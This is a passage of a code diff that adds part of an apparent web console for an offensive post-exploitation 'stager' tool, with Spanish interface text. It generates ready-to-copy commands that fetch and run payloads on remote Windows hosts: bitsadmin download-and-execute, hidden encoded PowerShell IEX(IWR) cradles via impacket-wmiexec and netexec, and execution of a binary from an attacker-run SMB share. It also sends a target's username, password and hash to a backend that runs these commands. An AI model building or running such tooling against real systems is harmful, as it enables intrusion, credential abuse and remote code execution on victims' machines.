+  'cmd.exe /c bitsadmin /transfer J /download /priority normal ${surl} ${rpath} && ${rpath}'`,
+
+    'ps-iex':
+`# PowerShell IEX fileless via WMIexec
+impacket-wmiexec ${impAuth} \\
+  'powershell -nop -w hidden -enc ${btoa(`IEX(IWR '${surl}' -UseBasicParsing)`)}'`,
+
+    'nxe-iex':
+`# PowerShell IEX via netexec
+netexec smb ${target} ${nxeAuth} \\
+  -x 'powershell -nop -w hidden -c "IEX(IWR ''${surl}'' -UseBasicParsing)"'`,
+
+    'smbserver':
+`# Terminal 1 — levantar servidor SMB en Kali (no deja rastro en disco del target)
+mkdir -p ${shareDir}
+cp ${lbin} ${shareDir}/${rName}
+impacket-smbserver share ${shareDir} -smb2support
+
+# Terminal 2 — ejecutar directamente desde el share UNC
+impacket-wmiexec ${impAuth} \\
+  '\\\\\\\\${kaliip}\\\\share\\\\${rName}'`,
+  };
+
+  for (const [id, cmd] of Object.entries(cradles)) {
+    const el = document.getElementById('cr-' + id);
+    if (el) el.textContent = cmd;
+  }
+}
+
+function stagerCopy(id) {
+  const el = document.getElementById('cr-' + id);
+  if (!el) return;
+  navigator.clipboard.writeText(el.textContent).then(() => showToast('Copiado al portapapeles', 'ok'));
+}
+
+async function stagerRun(action) {
+  const target = document.getElementById('st-target').value.trim();
+  const user   = document.getElementById('st-user').value.trim();
+  if (!target || !user) {
+    showToast('Target y usuario son obligatorios', 'err');
+    return;
+  }
+  const body = {
+    action,
+    method: document.getElementById('st-method').value,
+    target,
+    domain: document.getElementById('st-domain').value.trim(),
+    user,
+    pass:   document.getElementById('st-pass').value.trim(),
+    hash:   document.getElementById('st-hash').value.trim(),
+    lbin:   document.getElementById('st-lbin').value.trim(),
+    rpath:  document.getElementById('st-rpath').value.trim(),
+  };
+  const outEl = document.getElementById('st-run-output');
+  outEl.style.display = 'block';
+  outEl.textContent = '[ ejecutando... ]\n';
+  try {
+    const d = await api('POST', '/api/stager/run', body);
+    const ok = d.exit_code === 0;
+    outEl.style.color = ok ? 'var(--green)' : 'var(--red)';
+    outEl.textContent = (d.output || '(sin salida)') + `\n[exit ${d.exit_code}]`;
+  } catch(e) {
+    outEl.style.color = 'var(--red)';
+    outEl.textContent = 'Error: ' + e.message;
+  }
+}
+
+// Auto-detect server URL
+(function detectServer() {
+  const u = new URL(window.location.href);
+  const guessedBase = u.protocol + '//' + u.host;
+  if (!document.getElementById('login-url').value) {
+    document.getElementById('login-url').value = guessedBase;
+  }
+})();
+</script>
+</body>
+</html>
